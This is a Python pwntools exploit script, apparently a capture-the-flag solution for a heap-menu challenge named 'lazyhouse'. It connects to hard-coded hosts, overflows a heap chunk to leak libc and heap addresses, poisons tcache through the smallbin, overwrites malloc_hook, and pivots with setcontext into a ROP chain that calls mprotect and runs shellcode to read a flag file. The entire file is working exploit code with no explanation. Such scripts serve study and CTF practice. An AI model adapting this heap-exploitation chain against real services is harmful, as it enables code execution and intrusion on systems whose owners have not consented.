#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
host = "10.211.55.26"
port = 8888
host = "3.115.121.123"
port = 5731
context.arch = "amd64"    
r = remote(host,port)

def allocf(idx,size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("ex:")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))

def alloc(idx,size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("ex:")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil("House:")
    r.send(data)

def up(idx,data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil("ex:")
    r.sendline(str(idx))
    r.recvuntil("House:")
    r.send(data)

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("ex:")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil("ex:")
    r.sendline(str(idx))

def supper(data):
    r.recvuntil(":")
    r.sendline("5")
    r.recvuntil(":")
    r.send(data)
allocf(0,0x12c9fb4d812c9fc)
free(0)
alloc(0,0x200,'a')
alloc(1,0x800,'a')
alloc(2,0xa0,'c')
free(1)

alloc(1,0xa00,'a')
free(1)
up(0,'\x00'*0x200 + p64(0) + p64(0x813)) # overwrite size of next chunk
alloc(1,0x800,'a'*8)
show(1)
r.recvuntil("a"*8)

data = r.recvuntil("$")

libc =u64(data[:8])  - 0x1e5190
print "libc:",hex(libc)
heap =u64(data[8:16]) - 0x460

print "heap:",hex(heap)
free(2)
free(0)
alloc(0,0x410,'a')
alloc(7,0x100,'b')
alloc(2,0x610,'a'*0x300 )
alloc(3,0x218,'c')

#fill tcache
for i in range(5):
    free(3)
    alloc(3,0x218,'c')

free(0)
alloc(5,0x1f0,'da')
free(2)
alloc(6,0x3f0,'mehqq')

alloc(0,0x300,'x') 
flag = "/home/lazyhouse/flag"
sc = asm("""
    jmp name
open:
    pop rdi
    xor rdx,rdx
    mov rax,2
    syscall
read:
    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x40
    xor rax,rax
    syscall
write:
    mov rdx,rax
    mov rsi,rsp
    mov rdi,1
    mov rax,1
    syscall
exit:
    mov rax,0x60
    syscall



name:
    call open
    .ascii "%s"
    .byte 0
""" % flag)
alloc(2,0x230,sc)
target = libc+0x1e4a20+0x10


# trigger overflow to overwrite fd & bk so that we can corrupt smallbin 
# smallbin -> target -> next chunk
up(6,"\x00"*0x3f0 + p64(0) + p64(0x221) + p64(heap+0xf20) + p64(target-0x10)) 

mov_rdx_rax = libc + 0x127018
#  127018:	48 89 c2             	mov    rdx,rax
#  12701b:	ff 55 28             	call   QWORD PTR [rbp+0x28]
ret = libc + 0x55e90
setcontext = libc + 0x55e35
pop_rdi = libc + 0x0000000000026542
pop_rsi = libc + 0x26f9e
pop_rdx = libc + 0x000000000012bda6
rsp = heap+0xf30 + 0xf8+0x38
mprotect = libc + 0x117590
scaddr = heap+0x2850
rop = flat([pop_rdi,heap,pop_rsi,0x21000,pop_rdx,7,mprotect,scaddr])
payload = p64(heap+0xf30) + p64(mov_rdx_rax)
payload = payload.ljust(0xa0,"\x00")
payload += p64(rsp) + p64(ret)
payload = payload.ljust(0xf8,"\x00")
payload += p64(0)*5 + p64(setcontext)+ p64(0)
payload += rop


# smallbin -> target -> next chunk
# tcache -> a -> b -> c -> d -> e
# move chunk from smallbin to tcache
# https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3673
alloc(4,0x210,payload) 
# smallbin 
# tcache -> target -> next chunk -> a -> b -> c -> d -> e



gadget = libc + 0x10f9b5
# 10f9b5:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
#  10f9bc:	48 8d 8d f8 fe ff ff 	lea    rcx,[rbp-0x108]
#  10f9c3:	48 8b b5 c0 fe ff ff 	mov    rsi,QWORD PTR [rbp-0x140]
#  10f9ca:	48 8b bd e8 fe ff ff 	mov    rdi,QWORD PTR [rbp-0x118]
#  10f9d1:	8b 50 18             	mov    edx,DWORD PTR [rax+0x18]
#  10f9d4:	ff 95 10 ff ff ff    	call   QWORD PTR [rbp-0xf0]
supper('a'*0x200 + p64(gadget)) # take chunk from tcache and overwrite malloc_hook
free(0)
arg = heap+0xf30+0xf8
allocf(0,arg)
r.interactive()

